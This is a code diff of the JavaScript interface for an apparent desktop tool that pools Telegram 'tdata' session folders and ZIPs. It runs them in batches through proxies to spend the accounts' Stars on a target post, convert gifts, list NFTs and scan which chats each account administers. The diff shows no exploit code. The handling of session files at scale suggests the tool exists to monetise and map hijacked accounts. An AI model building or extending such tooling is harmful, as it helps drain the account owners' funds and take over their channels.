@@ -2,9 +2,8 @@ const state = {
   view: "accounts",
   settings: {},
   history: [],
-  library: { folders: [], proxies: [], admins: [] },
+  library: { pool: [], folders: [], proxies: [], adminScans: [] },
   sessions: [],
-  tdataPath: "",
   running: false,
   botRunning: false,
   query: "",
@@ -55,6 +54,24 @@ function okRuns() {
   return filteredHistory().filter((item) => item.ok && item.result);
 }
 
+function runStats(item) {
+  const result = item.result || {};
+  if (item.batch) {
+    return {
+      stars_sent: result.stars_sent || 0,
+      converted: result.gifts_converted || 0,
+      listed: result.nft_listed || 0,
+      stars_after: 0,
+    };
+  }
+  return {
+    stars_sent: result.stars_sent || 0,
+    converted: result.converted || 0,
+    listed: result.listed || 0,
+    stars_after: result.stars_after || 0,
+  };
+}
+
 function sum(list, pick) {
   return list.reduce((total, item) => total + Number(pick(item) || 0), 0);
 }
@@ -87,18 +104,29 @@ function metricCard(label, value, trendInfo, sub) {
 
 function renderMetrics(target) {
   const runs = okRuns();
-  const last = runs[0]?.result;
-  const prev = runs[1]?.result;
-  const sent = sum(runs, (item) => item.result.stars_sent);
-  const converted = sum(runs, (item) => item.result.converted);
-  const accounts = new Set(runs.map((item) => item.name)).size;
+  const sent = sum(runs, (item) => runStats(item).stars_sent);
+  const converted = sum(runs, (item) => runStats(item).converted);
+  const accounts = runs.reduce(
+    (total, item) => total + (item.batch ? item.result?.loaded || item.poolSize || 0 : 1),
+    0,
+  );
   const success = filteredHistory().length
     ? (runs.length / filteredHistory().length) * 100
     : 0;
   const prevSuccess = state.history.length > 1 ? 50 : 0;
   const html = [
-    metricCard("Отправлено звёзд", money(sent), trend(last?.stars_sent || 0, prev?.stars_sent || 0), rangeLabel()),
-    metricCard("Подарки в звёзды", money(converted), trend(last?.converted || 0, prev?.converted || 0), rangeLabel()),
+    metricCard(
+      "Отправлено звёзд",
+      money(sent),
+      trend(runStats(runs[0] || {}).stars_sent, runStats(runs[1] || {}).stars_sent),
+      rangeLabel(),
+    ),
+    metricCard(
+      "Подарки в звёзды",
+      money(converted),
+      trend(runStats(runs[0] || {}).converted, runStats(runs[1] || {}).converted),
+      rangeLabel(),
+    ),
     metricCard("Аккаунты", money(accounts), trend(accounts, Math.max(accounts - 1, 0)), rangeLabel()),
     metricCard("Успешные запуски", `${success.toFixed(1)} %`, trend(success, prevSuccess || success), rangeLabel()),
   ].join("");
@@ -152,7 +180,13 @@ function niceMax(value) {
 
 function chartModel(items) {
   const points = items.slice(0, 8).reverse();
-  const raw = Math.max(0, ...points.flatMap((item) => [item.result?.stars_sent || 0, item.result?.stars_after || 0]));
+  const raw = Math.max(
+    0,
+    ...points.flatMap((item) => {
+      const stats = runStats(item);
+      return [stats.stars_sent, stats.stars_after];
+    }),
+  );
   return { points, max: niceMax(raw) };
 }
 
@@ -185,8 +219,8 @@ function renderChart(target, tall) {
   const yOf = (value) => pad.t + innerH - (value / max) * innerH;
   const xOf = (index) =>
     pad.l + (points.length <= 1 ? innerW / 2 : (index / (points.length - 1)) * innerW);
-  const sent = points.map((item, index) => ({ x: xOf(index), y: yOf(item.result.stars_sent) }));
-  const left = points.map((item, index) => ({ x: xOf(index), y: yOf(item.result.stars_after) }));
+  const sent = points.map((item, index) => ({ x: xOf(index), y: yOf(runStats(item).stars_sent) }));
+  const left = points.map((item, index) => ({ x: xOf(index), y: yOf(runStats(item).stars_after) }));
   const yTicks = [0, 0.25, 0.5, 0.75, 1].map((part) => {
     const value = max * part;
     const y = yOf(value);
@@ -217,7 +251,7 @@ function renderChart(target, tall) {
 function growthCell(item, index, list) {
   const prev = list[index + 1];
   if (!item.result || !prev?.result) return `<td class="grow flat">—</td>`;
-  const info = trend(item.result.stars_sent, prev.result.stars_sent);
+  const info = trend(runStats(item).stars_sent, runStats(prev).stars_sent);
   return `<td class="grow ${info.cls}">${info.text}</td>`;
 }
 
@@ -228,14 +262,14 @@ function tableHtml(items, limit) {
   }
   const body = rows
     .map((item, index) => {
-      const result = item.result || {};
+      const stats = runStats(item);
       return `<tr>
-        <td class="name">${item.name || "tdata"}</td>
-        <td>${item.ok ? money(result.stars_sent) : "—"}</td>
-        <td>${item.ok ? money(result.converted) : "—"}</td>
+        <td class="name">${escapeHtml(item.name || "tdata")}</td>
+        <td>${item.ok ? money(stats.stars_sent) : "—"}</td>
+        <td>${item.ok ? money(stats.converted) : "—"}</td>
         ${growthCell(item, index, rows)}
-        <td>${item.ok ? money(result.listed) : "—"}</td>
-        <td>${item.ok ? money(result.stars_after) : item.error || "ошибка"}</td>
+        <td>${item.ok ? money(stats.listed) : "—"}</td>
+        <td>${item.ok ? money(stats.stars_after) : escapeHtml(item.error || "ошибка")}</td>
       </tr>`;
     })
     .join("");
@@ -257,7 +291,7 @@ function renderAccounts() {
       return `<article class="account">
         <div class="flag" style="background:${colors[index % colors.length]}">${code}</div>
         <b>${item.name}</b>
-        <span>${money(item.result.stars_sent)} ⭐ · ${item.result.converted} подарков</span>
+        <span>${money(runStats(item).stars_sent)} ⭐ · ${runStats(item).converted} подарков</span>
       </article>`;
     })
     .join("");
@@ -298,22 +332,141 @@ function renderProxies() {
     : `<p class="muted">Прокси нет. Можно работать напрямую.</p>`;
 }
 
-function renderAdmins() {
-  const items = state.library.admins.filter((item) => matchesQuery(`${item.name} ${item.telegramId}`));
-  $("admin-list").innerHTML = items.length
-    ? items
+function poolLabel(filePath) {
+  const base = String(filePath || "").split(/[\\/]/).pop() || filePath;
+  return base || "tdata";
+}
+
+function renderPool() {
+  const pool = state.library.pool || [];
+  $("pool-count").textContent = `${pool.length} ${pool.length === 1 ? "аккаунт" : pool.length < 5 ? "аккаунта" : "аккаунтов"}`;
+  $("pool-list").innerHTML = pool.length
+    ? pool
         .map(
-          (item) => `<div class="list-row"><div><b>${escapeHtml(item.name || "Админ")}</b><span>id ${escapeHtml(item.telegramId)}</span></div><button class="btn small danger" type="button" data-action="delete-admin" data-id="${escapeHtml(item.id)}">Удалить</button></div>`,
+          (item) => `<div class="list-row"><div><b>${escapeHtml(poolLabel(item.path))}</b><span>${escapeHtml(item.path)}</span></div><button class="btn small danger" type="button" data-action="remove-pool" data-id="${escapeHtml(item.id)}">Убрать</button></div>`,
         )
         .join("")
-    : `<p class="muted">Список пуст — бот доступен всем, кто знает его.</p>`;
+    : `<p class="muted">Пул пуст. Добавьте папку или ZIP.</p>`;
+}
+
+function fillAdminPoolSelect() {
+  const pool = state.library.pool || [];
+  const select = $("admin-pool-select");
+  const current = select.value;
+  select.innerHTML = [`<option value="">— выберите —</option>`]
+    .concat(pool.map((item) => `<option value="${escapeHtml(item.id)}">${escapeHtml(poolLabel(item.path))}</option>`))
+    .join("");
+  if ([...select.options].some((option) => option.value === current)) select.value = current;
+}
+
+function fillAdminProxySelect() {
+  const select = $("admin-proxy");
+  const current = select.value;
+  select.innerHTML = [`<option value="">Без прокси</option>`]
+    .concat(
+      state.library.proxies.map(
+        (item) => `<option value="${escapeHtml(item.id)}">${escapeHtml(item.label || `${item.host}:${item.port}`)}</option>`,
+      ),
+    )
+    .join("");
+  if ([...select.options].some((option) => option.value === current)) select.value = current;
+}
+
+function renderAdminChats() {
+  const scans = state.library.adminScans || [];
+  const scan = scans[0];
+  if (!scan) {
+    $("admin-account-label").textContent = "";
+    $("admin-chats-table").innerHTML = `<table><tr><td>Сканирований пока нет. Выберите tdata и нажмите «Сканировать».</td></tr></table>`;
+    return;
+  }
+  const acc = scan.account;
+  $("admin-account-label").textContent = acc
+    ? `${acc.name || ""} ${acc.username ? `@${acc.username}` : ""} · id ${acc.id} · ${new Date(scan.at).toLocaleString("ru-RU")}`
+    : new Date(scan.at).toLocaleString("ru-RU");
+  const chats = (scan.chats || []).filter((chat) =>
+    matchesQuery(`${chat.title} ${chat.username || ""} ${chat.type}`),
+  );
+  if (!chats.length) {
+    $("admin-chats-table").innerHTML = `<table><tr><td>${scan.ok ? "Админ-чатов не найдено." : "Скан не удался — смотрите журнал на «Аккаунтах»."}</td></tr></table>`;
+    return;
+  }
+  const body = chats
+    .map(
+      (chat) => `<tr>
+        <td class="name">${escapeHtml(chat.title)}</td>
+        <td>${escapeHtml(chat.type)}</td>
+        <td>${chat.username ? `@${escapeHtml(chat.username)}` : escapeHtml(String(chat.id))}</td>
+        <td>${escapeHtml(chat.rights)}</td>
+      </tr>`,
+    )
+    .join("");
+  $("admin-chats-table").innerHTML = `<table>
+    <thead><tr><th>НАЗВАНИЕ</th><th>ТИП</th><th>ID / USER</th><th>ПРАВА</th></tr></thead>
+    <tbody>${body}</tbody>
+  </table>`;
+}
+
+function renderLogsConsole() {
+  const items = filteredHistory();
+  let totalAccounts = 0;
+  let totalStars = 0;
+  let totalNft = 0;
+  let totalConverted = 0;
+  const lines = [];
+  for (const item of items) {
+    const stats = runStats(item);
+    if (item.batch && item.result) {
+      totalAccounts += item.result.loaded || item.poolSize || 0;
+    } else if (item.ok) {
+      totalAccounts += 1;
+    }
+    if (item.ok) {
+      totalStars += stats.stars_sent;
+      totalNft += stats.listed;
+      totalConverted += stats.converted;
+    }
+    const when = new Date(item.at).toLocaleString("ru-RU");
+    if (item.batch && item.result) {
+      lines.push(
+        `[${when}] ${item.name} · ok=${item.ok} · звёзд=${stats.stars_sent} · NFT=${stats.listed} · подарков=${stats.converted} · успешно ${item.result.succeeded}/${item.result.loaded}`,
+      );
+      for (const acc of item.result.accounts || []) {
+        if (acc.ok && acc.result) {
+          lines.push(
+            `    ${acc.name}: ⭐${acc.result.stars_sent} · nft=${acc.result.listed} · gifts=${acc.result.converted}`,
+          );
+        } else {
+          lines.push(`    ${acc.name}: ОШИБКА ${acc.error || "—"}`);
+        }
+      }
+    } else {
+      lines.push(
+        `[${when}] ${item.name} · ok=${item.ok} · звёзд=${stats.stars_sent} · NFT=${stats.listed} · подарков=${stats.converted}`,
+      );
+    }
+  }
+  const summary = [
+    "=== Сводка ===",
+    `Аккаунтов обработано: ${totalAccounts}`,
+    `Звёзд списано (на пост): ${money(totalStars)}`,
+    `NFT на витрине: ${totalNft}`,
+    `Подарков конвертировано: ${totalConverted}`,
+    "",
+    "=== Журнал ===",
+  ].join("\n");
+  const node = $("logs-console");
+  if (node) node.textContent = lines.length ? `${summary}\n${lines.join("\n")}` : `${summary}\n(запусков пока нет)`;
 }
 
 function renderLists() {
   renderSessions();
   renderFolders();
   renderProxies();
-  renderAdmins();
+  renderPool();
+  fillAdminPoolSelect();
+  fillAdminProxySelect();
+  renderAdminChats();
 }
 
 function fillProxySelect() {
@@ -347,11 +500,10 @@ function renderAll() {
   renderMetrics("gift-metrics");
   renderHeatmap();
   renderChart("chart", false);
-  renderChart("chart-full", true);
   renderAccounts();
   renderLists();
+  renderLogsConsole();
   $("dash-table").innerHTML = tableHtml(filteredHistory(), 4);
-  $("history-table").innerHTML = tableHtml(filteredHistory());
   const failed = state.history.some((item) => !item.ok);
   $("bell-dot").hidden = !failed;
 }
@@ -416,9 +568,17 @@ function appendLog(id, line) {
   node.scrollTop = node.scrollHeight;
 }
 
-function setPath(filePath) {
-  state.tdataPath = filePath || "";
-  $("tdata-path").textContent = state.tdataPath || "Файл ещё не выбран";
+async function addToPool(filePath) {
+  const path = String(filePath || "").trim();
+  if (!path) return;
+  if (!state.library.pool) state.library.pool = [];
+  if (state.library.pool.some((item) => item.path === path)) return;
+  state.library.pool.unshift({
+    id: String(Date.now()) + Math.random().toString(36).slice(2, 6),
+    path,
+    addedAt: new Date().toISOString(),
+  });
+  await persistLibrary();
 }
 
 async function boot() {
@@ -433,6 +593,9 @@ async function boot() {
   state.settings = snapshot.settings;
   state.history = snapshot.history || [];
   state.library = snapshot.library || state.library;
+  if (!Array.isArray(state.library.pool)) state.library.pool = [];
+  if (!Array.isArray(state.library.adminScans)) state.library.adminScans = [];
+  delete state.library.admins;
   state.sessions = snapshot.sessions || [];
   state.botRunning = snapshot.botRunning;
   fillForms();
@@ -471,8 +634,8 @@ $("channel-link").addEventListener("input", () => {
   paintLink("run-link", "link-preview");
 });
 
-$("pick-folder").addEventListener("click", async () => setPath(await window.desktop.pickFolder()));
-$("pick-zip").addEventListener("click", async () => setPath(await window.desktop.pickZip()));
+$("pick-folder").addEventListener("click", async () => addToPool(await window.desktop.pickFolder()));
+$("pick-zip").addEventListener("click", async () => addToPool(await window.desktop.pickZip()));
 
 const drop = $("drop");
 ["dragenter", "dragover"].forEach((name) =>
@@ -489,7 +652,7 @@ const drop = $("drop");
 );
 drop.addEventListener("drop", (event) => {
   const file = event.dataTransfer.files?.[0];
-  if (file) setPath(window.desktop.getPathForFile(file));
+  if (file) addToPool(window.desktop.getPathForFile(file));
 });
 
 $("save-channel").addEventListener("click", async () => {
@@ -512,8 +675,9 @@ $("run-btn").addEventListener("click", async () => {
     appendLog("log", "Ссылка на пост не распознана");
     return;
   }
-  if (!state.tdataPath) {
-    appendLog("log", "Сначала выберите tdata");
+  const poolPaths = (state.library.pool || []).map((item) => item.path);
+  if (!poolPaths.length) {
+    appendLog("log", "Пул пуст — добавьте папку или ZIP");
     return;
   }
   state.running = true;
@@ -525,8 +689,9 @@ $("run-btn").addEventListener("click", async () => {
   });
   try {
     const proxy = state.library.proxies.find((item) => item.id === $("run-proxy").value);
-    const done = await window.desktop.run({
-      tdataPath: state.tdataPath,
+    $("log").textContent = "";
+    const done = await window.desktop.runBatch({
+      tdataPaths: poolPaths,
       link: $("run-link").value.trim(),
       passcode: $("run-pass").value,
       proxyUrl: proxy ? proxyUrl(proxy) : "",
@@ -606,20 +771,31 @@ $("add-proxy").addEventListener("click", async () => {
   await persistLibrary();
 });
 
-$("add-admin").addEventListener("click", async () => {
-  const telegramId = $("admin-id").value.trim();
-  if (!/^\d+$/.test(telegramId)) {
-    $("admin-list").insertAdjacentHTML("afterbegin", `<p class="muted">Нужен числовой Telegram id.</p>`);
+$("scan-admins-btn").addEventListener("click", async () => {
+  const poolId = $("admin-pool-select").value;
+  const entry = (state.library.pool || []).find((item) => item.id === poolId);
+  if (!entry) {
+    $("admin-scan-state").textContent = "Выберите tdata из пула";
     return;
   }
-  state.library.admins.unshift({
-    id: String(Date.now()),
-    name: $("admin-name").value.trim(),
-    telegramId,
-  });
-  $("admin-name").value = "";
-  $("admin-id").value = "";
-  await persistLibrary();
+  $("admin-scan-state").textContent = "Сканирование…";
+  $("scan-admins-btn").disabled = true;
+  try {
+    const proxy = state.library.proxies.find((item) => item.id === $("admin-proxy").value);
+    const { library } = await window.desktop.scanAdmins({
+      tdataPath: entry.path,
+      passcode: $("admin-pass").value,
+      proxyUrl: proxy ? proxyUrl(proxy) : "",
+    });
+    state.library = library;
+    renderLists();
+    $("admin-scan-state").textContent = "Готово";
+  } catch (error) {
+    $("admin-scan-state").textContent = error.message || String(error);
+  } finally {
+    $("scan-admins-btn").disabled = false;
+    $("admin-pass").value = "";
+  }
 });
 
 document.body.addEventListener("click", async (event) => {
@@ -635,15 +811,15 @@ document.body.addEventListener("click", async (event) => {
     await persistLibrary();
   }
   if (action === "use-folder") {
-    setPath(button.dataset.path);
+    addToPool(button.dataset.path);
     showView("accounts");
+  }
+  if (action === "remove-pool") {
+    state.library.pool = (state.library.pool || []).filter((item) => item.id !== button.dataset.id);
+    await persistLibrary();
   }
   if (action === "delete-proxy") {
     state.library.proxies = state.library.proxies.filter((item) => item.id !== button.dataset.id);
-    await persistLibrary();
-  }
-  if (action === "delete-admin") {
-    state.library.admins = state.library.admins.filter((item) => item.id !== button.dataset.id);
     await persistLibrary();
   }
 });
